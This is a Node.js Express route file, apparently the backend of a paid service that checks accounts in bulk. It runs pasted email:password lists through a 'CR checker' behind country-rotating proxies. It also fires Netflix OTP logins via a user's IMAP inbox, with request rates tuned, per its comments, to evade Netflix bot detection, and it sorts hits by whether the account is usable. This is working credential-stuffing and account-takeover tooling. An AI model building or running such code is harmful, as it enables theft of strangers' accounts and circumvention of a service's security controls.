const { Router } = require("express");
const { User, Setting, Log, ProxyCredential, ImapCredential } = require("../models");
const { requireAuth } = require("../middlewares/auth");

const router = Router();
router.use(requireAuth);

// Proxy country pool for round-robin rotation per account
const PROXY_COUNTRIES = [
  "us", "gb", "ca", "au", "de", "fr", "jp",
  "sg", "nl", "br", "mx", "kr", "it", "es",
];

async function getSetting(key, fallback = 0) {
  const row = await Setting.findOne({ key }).lean();
  return row ? parseFloat(row.value) || fallback : fallback;
}

async function getSettingStr(key, fallback = "") {
  const row = await Setting.findOne({ key }).lean();
  return row && row.value ? row.value : fallback;
}

async function deductCredits(userId, amount) {
  const result = await User.findOneAndUpdate(
    { _id: userId, credits: { $gte: amount } },
    { $inc: { credits: -amount } },
    { new: true }
  );
  if (!result) {
    const u = await User.findById(userId).lean();
    return { ok: false, newCredits: u ? u.credits : 0 };
  }
  return { ok: true, newCredits: result.credits };
}

/**
 * Build a per-account proxy URL from the user's stored proxy credentials.
 * Rotates country on each call using the provided index.
 */
async function buildProxyUrl(userId, rotationIndex) {
  const cred = await ProxyCredential.findOne({ userId }).lean();
  if (!cred) return undefined;
  const cc = PROXY_COUNTRIES[rotationIndex % PROXY_COUNTRIES.length];
  const basePassword = cred.password.replace(/_country-[a-z]+$/i, "");
  return `http://${cred.username}:${basePassword}_country-${cc}@${cred.host}:${cred.port}`;
}

/**
 * Call the CR checker droplet for a single account.
 */
async function callDroplet(dropletUrl, email, password, proxyUrl) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 45000);
  try {
    const resp = await fetch(`${dropletUrl}/cr-check`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password, proxyUrl }),
      signal: controller.signal,
    });
    clearTimeout(timeout);
    const data = await resp.json();
    return data;
  } catch (err) {
    clearTimeout(timeout);
    throw err;
  }
}

function parseInputList(text) {
  return text
    .split("\n")
    .map((l) => l.trim())
    .filter(Boolean)
    .map((line) => {
      const idx = line.indexOf(":");
      if (idx === -1) return null;
      const email = line.slice(0, idx).trim();
      const password = line.slice(idx + 1).trim();
      if (!email || !password) return null;
      return { email, password };
    })
    .filter(Boolean);
}

function parseEmailList(text) {
  return text
    .split("\n")
    .map((l) => l.trim())
    .filter((l) => l && l.includes("@"))
    .map((line) => line.split(/\s+/)[0]);
}

router.post("/cr/check-bulk", async (req, res) => {
  const userId = req.user.id;
  const { accounts: rawText, concurrency: rawConc } = req.body;
  const accounts = parseInputList(rawText || "");
  if (!accounts.length) return res.status(400).json({ error: "No valid accounts" });

  const dropletUrl = await getSettingStr("droplet_signup_code", "");
  if (!dropletUrl) {
    return res.status(503).json({ error: "Signup Code droplet not configured. Set the URL in Admin → Droplet Endpoints." });
  }

  const creditCost = await getSetting("credit_cost_cr_check", 0.5);
  const maxConc = Math.min(parseInt(rawConc) || 5, 10);
  const totalCost = creditCost * accounts.length;

  const deducted = await deductCredits(userId, totalCost);
  if (!deducted.ok) {
    const user = await User.findById(userId).lean();
    return res.status(402).json({
      error: `Insufficient credits. Need ${totalCost.toFixed(2)}, have ${(user?.credits || 0).toFixed(2)}`,
    });
  }

  res.setHeader("Content-Type", "application/x-ndjson");
  res.setHeader("Transfer-Encoding", "chunked");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("X-Accel-Buffering", "no");

  let completed = 0;
  let active = 0;
  let rotationIdx = 0;
  const queue = [...accounts];
  const pending = [];

  const sendProgress = () => {
    res.write(
      JSON.stringify({ __progress: true, completed, total: accounts.length, active }) + "\n"
    );
  };

  const runOne = async (account, idx) => {
    active++;
    sendProgress();
    try {
      const proxyUrl = await buildProxyUrl(userId, idx);
      const result = await callDroplet(dropletUrl, account.email, account.password, proxyUrl);
      await Log.create({
        userId,
        type: "cr-check",
        email: account.email,
        status: result.status,
        result: { tier: result.tier, containerType: result.containerType, error: result.error },
        creditsUsed: creditCost,
      });
      res.write(JSON.stringify(result) + "\n");
    } catch (err) {
      const errResult = { status: "error", email: account.email, error: err.message };
      await Log.create({
        userId,
        type: "cr-check",
        email: account.email,
        status: "error",
        result: { error: err.message },
        creditsUsed: creditCost,
      });
      res.write(JSON.stringify(errResult) + "\n");
    } finally {
      active--;
      completed++;
      sendProgress();
    }
  };

  while (queue.length > 0 || pending.length > 0) {
    while (pending.length < maxConc && queue.length > 0) {
      const account = queue.shift();
      const idx = rotationIdx++;
      const p = runOne(account, idx).then(() => {
        pending.splice(pending.indexOf(p), 1);
      });
      pending.push(p);
    }
    if (pending.length > 0) await Promise.race(pending);
  }

  res.end();
});

// ── Signup Code bulk endpoint ────────────────────────────────────────────────
// Fires Netflix OTP sign-in via the signup-code droplet.
// Rate: 2 every 2 seconds (1/sec), concurrency hard-capped at 2, NO retries.
// Higher rates trigger Netflix's burst detection (returns "unamed-core-realm-screen"
// for some emails). 2/2s is the validated sweet spot — see signup-code-droplet README.
// Requires the user to have an IMAP account connected.
router.post("/cr/signup-code-bulk", async (req, res) => {
  const userId = req.user.id;
  const { emails: rawEmails } = req.body;

  const emails = parseEmailList(rawEmails || "");
  if (!emails.length) {
    return res.status(400).json({ error: "No valid emails provided." });
  }

  // Gate: user must have IMAP connected
  const imapCred = await ImapCredential.findOne({ userId }).lean();
  if (!imapCred) {
    return res.status(402).json({
      error: "IMAP not connected. Go to IMAP / Gmail settings and connect your inbox before using this feature.",
      code: "NO_IMAP",
    });
  }

  const dropletUrl = await getSettingStr("droplet_signup_code", "");
  if (!dropletUrl) {
    return res.status(503).json({ error: "Signup Code droplet not configured. Contact admin." });
  }

  const creditCost = await getSetting("credit_cost_signup_code", 4);
  const totalCost = creditCost * emails.length;

  const deducted = await deductCredits(userId, totalCost);
  if (!deducted.ok) {
    const u = await User.findById(userId).lean();
    return res.status(402).json({
      error: `Insufficient credits. Need ${totalCost.toFixed(2)}, have ${(u?.credits || 0).toFixed(2)}`,
    });
  }

  res.setHeader("Content-Type", "application/x-ndjson");
  res.setHeader("Transfer-Encoding", "chunked");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("X-Accel-Buffering", "no");

  const streamLine = (obj) => res.write(JSON.stringify(obj) + "\n");

  streamLine({ __total: emails.length });

  let active = 0;

  // Hide Netflix soft-block / MFA-challenge specifics from end users.
  // Admin still sees the full original string in Log.result.detail.
  // `browseStatus` is the post-verify /browse classifier from the droplet —
  // distinguishes a usable account from one that verifies-OK but is on hold,
  // cancelled, or otherwise unusable (the customer's most-asked-for distinction).
  const sanitizeSignupCodeDetail = (detail, browseStatus) => {
    // Prefer browse-classifier verdict when present — it's the authoritative
    // post-verify account state.
    switch (browseStatus) {
      case "on_hold":
        return "HOLD";
      case "former_member":
      case "wiped":
        return "Failed — account is cancelled / former member";
      case "unknown":
        return "Failed — could not confirm account is active";
      default:
        break;
    }
    if (!detail) return "FAILED";
    const s = String(detail);
    if (/OTP\s+not\s+found/i.test(s)) {
      return "FAILED";
    }
    if (/MFA[\s_-]?COLLECT|soft[\s-]?block|MFA_CHALLENGE|MFA_VERIFY/i.test(s)) {
      return "Failed — Netflix requires additional verification";
    }
    if (/recaptcha|captcha/i.test(s)) {
      return "Failed — Netflix bot challenge triggered";
    }
    if (/unrecognized\s*screen|unknown_screen|unauthor/i.test(s)) {
      return "Failed — unexpected Netflix response";
    }
    if (/PASSWORD_ONLY_LOGIN|password.only.login/i.test(s)) {
      return "Failed — account is cancelled / former member";
    }
    return s;
  };

  const fireOne = async (email) => {
    active++;
    const startedAt = Date.now();
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 120_000);
      let result;
      try {
        const resp = await fetch(`${dropletUrl}/api/netflix/login-via-otp`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Service-Key": process.env.SIGNUP_CODE_API_KEY || "",
          },
          body: JSON.stringify({
            email,
            imapEmail: imapCred.email,
            imapPassword: imapCred.password,
            // Optional country code (ISO-2, e.g. "in", "us", "th") — pinned per
            // request when the caller wants a specific proxy egress country.
            // If omitted, the droplet rotates across its 15-country pool.
            ...(req.body?.countryIsoCode
              ? { countryIsoCode: String(req.body.countryIsoCode).toLowerCase().trim() }
              : {}),
          }),
          signal: controller.signal,
        });
        clearTimeout(timeout);
        result = await resp.json();
      } catch (fetchErr) {
        clearTimeout(timeout);
        throw fetchErr;
      }

      const browseStatus = result?.browse?.status;
      // Verify-accepted means Netflix accepted the OTP and the login itself
      // succeeded. The post-login /browse classifier returning "unknown" just
      // means Netflix served a page we don't recognise (e.g. /unsupported) —
      // the actual sign-in worked. Per product decision, treat that case as
      // SUCCESS instead of failure. (on_hold / former_member / wiped / error
      // are still failures via the droplet's own ok=false.)
      const verifyAccepted = /verify\s+accepted/i.test(String(result.detail || ""));
      const ok = result.ok === true || (verifyAccepted && browseStatus === "unknown");
      await Log.create({
        userId,
        type: "signup-code",
        email,
        status: ok ? "success" : "failed",
        result: {
          detail: result.detail,
          otp: result.otp,
          country: result.country,
          error: result.error,
          // Diagnostic fields from the droplet so we can audit fake-success / fake-failure
          // claims after the fact (Netflix's actual outcomeType, nextScreen, and alerts).
          outcome: result.outcome,
          nextScreen: result.nextScreen,
          alerts: result.alerts,
          // Top-level account status from the droplet ("success" | "wiped" |
          // "on_hold" | "former_member" | "unknown" | "error").
          accountStatus: result.status,
          // Post-verify /browse classifier — the authoritative usability signal.
          // Lives at result.browse on the droplet response.
          browse: result.browse || null,
        },
        creditsUsed: creditCost,
      });

      active--;
      const rawDetail = result.detail || result.error || "";
      streamLine({
        email,
        ok,
        status: ok ? "success" : "failed",
        // Customer-facing message: hide droplet diagnostics (status=SUCCESS, nav=/browse,
        // outcome=…, screen=…) — those are admin-only and live in Mongo Log.result.
        // On success show the bare phrase; on failure show the sanitized reason
        // (preferring the /browse classifier verdict when present).
        detail: ok
          ? "Logged in successfully"
          : sanitizeSignupCodeDetail(rawDetail, browseStatus),
        otp: ok ? (result.otp || "") : "",
        country: result.country || "",
        totalMs: Date.now() - startedAt,
        __active: active,
      });
    } catch (err) {
      active--;
      await Log.create({
        userId,
        type: "signup-code",
        email,
        status: "error",
        result: { error: err.message },
        creditsUsed: creditCost,
      });
      streamLine({
        email,
        ok: false,
        status: "failed",
        detail: err.message || "Connection failed",
        totalMs: Date.now() - startedAt,
        __active: active,
      });
    }
  };

  try {
    const queue = [...emails];
    const allPromises = [];

    // 1/sec = 2 every 2 seconds, hard concurrency cap of 2.
    // Validated against Netflix Apr 2026 — higher bursts cause "unamed-core-realm-screen"
    // bot-detection screens for ~30% of emails. 2/2s yields stable verify-acceptance.
    while (queue.length) {
      const batch = queue.splice(0, 2);
      batch.forEach((email) => allPromises.push(fireOne(email)));
      if (queue.length) await new Promise((r) => setTimeout(r, 2000));
    }

    await Promise.all(allPromises);
  } catch (fatal) {
    streamLine({ __error: true, error: fatal.message });
  } finally {
    const finalUser = await User.findById(userId).lean();
    streamLine({ __done: true, newCredits: finalUser ? finalUser.credits : deducted.newCredits });
    res.end();
  }
});

router.get("/cr/settings", async (req, res) => {
  const cost = await getSetting("credit_cost_cr_check", 0.5);
  res.json({ credit_cost_cr_check: cost });
});

module.exports = router;
